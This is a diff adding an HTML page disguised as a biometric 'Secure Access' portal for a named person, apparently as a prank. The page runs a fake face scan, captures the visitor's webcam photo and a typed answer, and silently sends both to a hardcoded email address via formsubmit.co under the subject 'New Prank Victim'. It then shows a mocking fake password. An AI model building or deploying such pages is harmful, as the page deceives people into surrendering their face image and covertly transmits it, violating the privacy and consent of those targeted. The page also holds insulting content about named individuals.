@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Secure Access | PKSA Portal</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        :root { --neon-blue: #00f3ff; --alert-red: #ff3333; --success-green: #00ff41; --dark-bg: #050a0f; }
+        body { background-color: var(--dark-bg); color: var(--neon-blue); font-family: 'Courier New', Courier, monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; overflow: hidden; text-transform: uppercase; }
+        
+        /* Containers */
+        .screen-container { width: 100%; max-width: 450px; padding: 25px; box-sizing: border-box; text-align: center; display: none; animation: fadeIn 0.5s; }
+        .active-screen { display: block; }
+
+        /* Typography */
+        h1 { font-size: 1.4rem; margin-bottom: 20px; letter-spacing: 2px; border-bottom: 2px solid var(--neon-blue); display: inline-block; padding-bottom: 5px; }
+        p { text-transform: none; font-size: 0.95rem; line-height: 1.5; color: #ccc; margin-bottom: 25px; }
+
+        /* Buttons */
+        .cyber-btn { 
+            background: rgba(0, 243, 255, 0.1); border: 2px solid var(--neon-blue); color: var(--neon-blue);
+            padding: 15px; font-weight: bold; cursor: pointer; font-family: inherit; font-size: 1rem; width: 100%;
+            transition: 0.3s; letter-spacing: 2px; margin-top: 10px;
+        }
+        .cyber-btn:hover { background: var(--neon-blue); color: var(--dark-bg); box-shadow: 0 0 20px var(--neon-blue); }
+        .btn-red { border-color: var(--alert-red); color: var(--alert-red); background: rgba(255, 51, 51, 0.1); }
+        .btn-red:hover { background: var(--alert-red); color: white; box-shadow: 0 0 20px var(--alert-red); }
+        .btn-green { border-color: var(--success-green); color: var(--success-green); background: rgba(0, 255, 65, 0.1); }
+        .btn-green:hover { background: var(--success-green); color: black; box-shadow: 0 0 20px var(--success-green); }
+
+        /* Scanner Styling */
+        .scanner-viewport { 
+            width: 100%; height: 350px; background: #000; position: relative; 
+            margin-bottom: 20px; border: 2px solid var(--neon-blue); overflow: hidden; 
+            box-shadow: 0 0 25px rgba(0, 243, 255, 0.2) inset;
+        }
+        video, #previewImage { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+        canvas { display: none; }
+
+        /* Face Guide Overlay */
+        .face-guide { 
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            width: 180px; height: 260px; border: 2px dashed rgba(0, 243, 255, 0.5); border-radius: 50% 50% 40% 40%;
+            pointer-events: none;
+        }
+        
+        /* Scanning Beam */
+        .active-beam {
+            position: absolute; top: -10%; left: 0; width: 100%; height: 20px;
+            background: linear-gradient(to bottom, transparent, var(--neon-blue)); opacity: 0.8;
+            display: none; pointer-events: none;
+        }
+        .scanning .active-beam { display: block; animation: beamScan 1.5s infinite linear; }
+        @keyframes beamScan { 0% { top: -10%; } 100% { top: 110%; } }
+
+        /* Loading Bars */
+        .loading-bar { width: 100%; height: 8px; background: #222; margin: 15px 0; position: relative; }
+        .loading-fill { height: 100%; width: 0%; background: var(--neon-blue); transition: width 0.2s; }
+
+        /* Inputs */
+        input[type="text"] { 
+            width: 100%; padding: 12px; background: rgba(255, 51, 51, 0.1); 
+            border: 1px solid var(--alert-red); color: var(--alert-red); font-family: inherit; font-size: 1.1rem; outline: none;
+            text-align: center; margin-bottom: 15px;
+        }
+
+        /* Success Creds */
+        .creds-box { border: 2px solid var(--success-green); padding: 15px; margin: 20px 0; background: rgba(0, 255, 65, 0.05); text-align: left; }
+        .creds-row { margin: 10px 0; font-size: 1.1rem; display: flex; justify-content: space-between; color: var(--success-green); }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
+</head>
+<body>
+
+    <div id="screen1" class="screen-container active-screen">
+        <h1><i class="fas fa-user-lock"></i> SECURE ACCESS</h1>
+        <p>Welcome, <strong>Yugs</strong>.</p>
+        <p>The Advanced Roadmap is ready. However, we require biometric verification to release your secure credentials.</p>
+        <p>Please confirm your identity to proceed.</p>
+        <button class="cyber-btn" onclick="goToCamera()">START VERIFYING <i class="fas fa-arrow-right"></i></button>
+    </div>
+
+    <div id="screen2" class="screen-container">
+        <h1><i class="fas fa-camera"></i> FACE SCAN</h1>
+        
+        <div class="scanner-viewport" id="scannerViewport">
+            <video id="video" autoplay playsinline></video>
+            <img id="previewImage" style="display:none;">
+            <canvas id="canvas"></canvas>
+            <div class="face-guide"></div>
+        </div>
+
+        <div id="captureControls">
+            <p>Position your face within the guide.</p>
+            <button class="cyber-btn" onclick="takePhoto()">CAPTURE PHOTO</button>
+        </div>
+
+        <div id="reviewControls" style="display:none;">
+            <p>Proceed with this photo?</p>
+            <div style="display:flex; gap:10px;">
+                <button class="cyber-btn btn-red" onclick="retakePhoto()">RETAKE</button>
+                <button class="cyber-btn btn-green" onclick="confirmPhoto()">CONFIRM & SCAN</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="screen3" class="screen-container">
+        <h1><i class="fas fa-microchip"></i> PROCESSING</h1>
+        
+        <div id="processingPhase">
+            <div class="scanner-viewport scanning" style="height:200px; border-style:dashed;">
+                <img id="processingImg" style="width:100%; height:100%; object-fit:cover; opacity:0.6;">
+                <div class="active-beam"></div>
+            </div>
+            <p id="processText" style="color:var(--neon-blue);">INITIATING FACE DETECTION...</p>
+            <div class="loading-bar"><div class="loading-fill" id="scanBar"></div></div>
+        </div>
+
+        <div id="twistPhase" style="display:none;">
+            <h2 style="color:var(--alert-red); border:none;"><i class="fas fa-exclamation-triangle"></i> ANOMALY DETECTED</h2>
+            <p style="color:#ccc;">Face Matched. Identity: <strong>Yogita Patil</strong></p>
+            <p style="color:var(--alert-red); font-weight:bold;">WAIT... SYSTEM DETECTED UNUSUAL BEHAVIOR.</p>
+            <p>Please provide a reason to override security:</p>
+            
+            <label style="color:var(--alert-red); display:block; margin-bottom:10px; font-size:0.8rem;">QUESTION: "WHAT IS WRONG WITH YOU?"</label>
+            <input type="text" id="reasonInput" placeholder="TYPE REASON...">
+            
+            <button class="cyber-btn btn-red" id="finalSubmitBtn" onclick="submitReason()">SUBMIT & UNLOCK</button>
+        </div>
+    </div>
+
+    <div id="screen4" class="screen-container">
+        <h1 style="color:var(--success-green); border-color:var(--success-green);">ACCESS GRANTED</h1>
+        <p>Identity Confirmed: <strong style="color:white;">Yogita Patil</strong></p>
+        
+        <div class="creds-box">
+            <div class="creds-row"><span>Username:</span> <strong>yugs</strong></div>
+            <div class="creds-row"><span>Password:</span> <strong>yugsisabitch</strong></div>
+        </div>
+
+        <a href="index.html" class="cyber-btn btn-green" style="text-decoration:none; display:block;">
+            OPEN ROADMAP <i class="fas fa-external-link-alt"></i>
+        </a>
+    </div>
+
+    <script>
+        // ================= CONFIGURATION =================
+        const YOUR_EMAIL = "pksa49@gmail.com"; // <-- PUT YOUR EMAIL!
+        // =============================================
+
+        // Variables
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const previewImg = document.getElementById('previewImage');
+        const processingImg = document.getElementById('processingImg');
+        let imageBlob = null;
+
+        // --- Navigation ---
+        function switchScreen(id) {
+            document.querySelectorAll('.screen-container').forEach(el => el.classList.remove('active-screen'));
+            document.getElementById(id).classList.add('active-screen');
+        }
+
+        // --- Step 1: Camera ---
+        async function goToCamera() {
+            switchScreen('screen2');
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                video.srcObject = stream;
+            } catch (err) {
+                alert("Camera access denied. Prank failed successfully.");
+            }
+        }
+
+        // --- Step 2: Capture & Review ---
+        function takePhoto() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            // Show Preview
+            const dataUrl = canvas.toDataURL('image/jpeg');
+            previewImg.src = dataUrl;
+            processingImg.src = dataUrl; // Set for next screen too
+            
+            video.style.display = 'none';
+            previewImg.style.display = 'block';
+            
+            document.getElementById('captureControls').style.display = 'none';
+            document.getElementById('reviewControls').style.display = 'block';
+
+            // Save Blob for upload
+            canvas.toBlob(blob => { imageBlob = blob; }, 'image/jpeg', 0.8);
+        }
+
+        function retakePhoto() {
+            video.style.display = 'block';
+            previewImg.style.display = 'none';
+            document.getElementById('captureControls').style.display = 'block';
+            document.getElementById('reviewControls').style.display = 'none';
+        }
+
+        function confirmPhoto() {
+            switchScreen('screen3');
+            runFakeScan();
+        }
+
+        // --- Step 3: Fake Scan Animation ---
+        function runFakeScan() {
+            const bar = document.getElementById('scanBar');
+            const text = document.getElementById('processText');
+            
+            // Animation Timeline
+            setTimeout(() => { bar.style.width = "30%"; text.innerText = "ANALYZING BIOMETRIC GEOMETRY..."; }, 1000);
+            setTimeout(() => { bar.style.width = "60%"; text.innerText = "COMPARING DATABASE RECORDS..."; }, 2500);
+            setTimeout(() => { bar.style.width = "100%"; text.innerText = "IDENTITY MATCH FOUND..."; text.style.color = "var(--success-green)"; }, 4000);
+            
+            // The Twist
+            setTimeout(() => {
+                document.getElementById('processingPhase').style.display = 'none';
+                document.getElementById('twistPhase').style.display = 'block';
+            }, 5500);
+        }
+
+        // --- Step 4: Submit & Finish ---
+        async function submitReason() {
+            const reason = document.getElementById('reasonInput').value;
+            if(!reason) { alert("Please provide a reason."); return; }
+
+            const btn = document.getElementById('finalSubmitBtn');
+            btn.innerHTML = "UPLOADING...";
+            btn.disabled = true;
+
+            // FormSubmit Upload
+            const formData = new FormData();
+            formData.append("photo", imageBlob, "face_scan.jpg");
+            formData.append("reason", reason);
+            formData.append("_subject", "🚨 New Prank Victim (Yogita)");
+            formData.append("_captcha", "false");
+
+            try {
+                await fetch(`https://formsubmit.co/ajax/${YOUR_EMAIL}`, { method: "POST", body: formData });
+            } catch (e) { console.log("Upload error (ignored for prank flow)"); }
+
+            // Show Success Screen
+            setTimeout(() => {
+                switchScreen('screen4');
+                // Stop camera
+                if(video.srcObject) video.srcObject.getTracks().forEach(track => track.stop());
+            }, 1500);
+        }
+    </script>
+</body>
+</html>
